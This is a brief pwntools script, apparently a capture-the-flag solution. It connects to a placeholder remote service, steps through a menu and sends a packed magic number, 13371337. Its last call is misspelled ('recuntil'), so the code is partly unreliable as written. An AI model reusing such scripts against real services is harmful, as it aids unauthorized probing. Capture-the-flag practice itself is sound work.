from pwn import *

r = remote('ip',port)
print(r.recvuntil(b'>> '))
r.sendline('T')
print(r.recvuntil(b'>> '))
r.sendline('S')
print(r.recvuntil(b'>> '))
r.sendline(p64(13371337))
print(r.recvuntil(b'>> '))
r.sendline('C')
print(r.recuntil())
r.close()
